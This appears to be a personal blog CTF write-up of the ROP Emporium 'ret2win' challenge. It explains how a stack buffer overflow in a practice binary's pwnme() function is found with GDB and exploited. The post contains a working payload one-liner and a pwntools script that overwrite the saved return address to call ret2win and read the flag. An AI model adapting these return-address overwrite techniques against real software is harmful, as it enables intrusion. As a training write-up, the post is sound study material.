---
layout: post
title:  "ROP Emporium - Ret2win"
date:   2020-05-8 14:07:19
categories: [ROP]
excerpt: "Doing these challenges to improve my binary exploitation skills and teach my self Return oriented programming (ROP). These challenges use the usual CTF objective of retrieving the contents of a file named flag.txt from a remote machine by exploiting a given binary"

comments: true
---


## Introduction
Doing these challenges to improve my binary exploitation skills and teach my self Return oriented programming (ROP).These challenges use the usual CTF objective of retrieving the contents of a file named "flag.txt" from a remote machine by exploiting a given binary. ROP theory is out of scope of this article, If you want ROP theory there are lot of good resources out there.

###### Description 
Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.
Click below to download the binary. 

###### About the Binary:
Our binary is usual ELF executable in 64-bit architecture. 

![source-01](/img/Screenshot_2020-05-09_11-12-06.png){: .align-left}


PIE isn't enabled so the binary will be loaded at a fixed location into memory (0x400000) everytime. With nx set to true, we know shellcode cannot be executed off the stack and we know binary has ASLR disabled.

## Analyzing the 64bit ELF binary
Lets load the binary with GDB and dump the functions.
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400811  ret2win
0x0000000000400840  __libc_csu_init
0x00000000004008b0  __libc_csu_fini
0x00000000004008b4  _fini
```
Here we can see interesting functions:
- main()
- pwnme()
- ret2win()

So lets see what this fucntions does!

###### main():


![source-01](/img/Screenshot_2020-05-09_11-15-15.png){: .align-left}


So The main function  uses puts() to output some texts, then calls the pwnme(), the texts we get when we run the program first time.


###### pwnme():


![source-01](/img/Screenshot_2020-05-09_11-16-18.png){: .align-left}


We see that the pwnme function allocates a 32 byte (0x20 hex) area of memory.This function takes user input using fgets(), and stores it in a  buffer of size 32. There is no bound check on the buffer, it is pretty clear that there is a is a stack bufferoverlow here.


###### ret2win()


![source-01](/img/Screenshot_2020-05-09_11-17-39.png){: .align-left}


This function call system with /bin/cat flag.txt, so we need to return to this function to exploit the binary successfuly. 


## Fuzzing:
So now the binary analysis is out of the way. Lets start fuzzing the binary.
Run the program and send more than 40 bytes
```

➜  ret2win ./ret2win      
ret2win by ROP Emporium
64bits
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaa
[5]    74490 segmentation fault  ./ret2win

```
As expected the program segfaulted (crashed),we have a valid crash scenario here,but we are not sure if we have overwritten any registers.So lets attach the binary to gdb and analyze the crash.

Attach the binary to GDB using gdb -q return2win

###### Calculating offset
Generate cylic pattern and send to the program
```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
```
Copy past the generated pattern to the program


![source-01](/img/Screenshot_2020-05-09_11-20-57.png){: .align-left}


The program has crashed and we have overwritten the rsp,to find the extact offset copy the hex at rsp to the clipboard, then type pattern offset.


![source-01](/img/Screenshot_2020-05-09_11-23-21.png){: .align-left}


## Exploiting:

We have 40 bytes to fill the stack and then we need to put the address of the ret2win function.So that the saved return address will contain the address of the ret2win function (0x400811), and the program  execute the function.

The exploit then will look as follows:

**Payload: 

The payload will be very simple, just our junk and return address, when writting return address keep an eye for endianess.

[40 chars of junk] + [address of ret2win]  "A"*40             + "\x11\x08\x40"

**Here is my final exploit:

> python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win


![source-01](/img/Screenshot_2020-05-09_15-53-55.png){: .align-left}



Putting it all together,and i developed the final exploit with pwntools (python library) just for fun and learning.

```python

#!/usr/bin/python                                                              
 from pwn import *                                                              
 def main():                                                                    
     context.log_level = "info"                                                 
     elf = ELF('./ret2win')                                                     
     info(elf.symbols.ret2win)                                                  
     p = process(elf.path)                                                      
     ret2win = p64(elf.symbols.ret2win)                                         
     payload = b"A"*40 + ret2win                                                
     p.sendline(payload)                                                        
     p.recvuntil("Here's your flag:")                                           
     flag = p.recvline()                                                        
     success(flag)                                                              
 if __name__== "__main__":                                                      
     main()    
```

![source-01](/img/Screenshot_2020-05-09_16-20-05.png){: .align-left}


w00t we got the flag!

###### End 

Thats the end of ret2win challenge,it is a very simple one but as i progress through the challenges the exploits will become more complex and fun. Remember never stop learning, Cheers!.

> Code for this challenge  https://github.com/d3b4g/ROP-Emporium



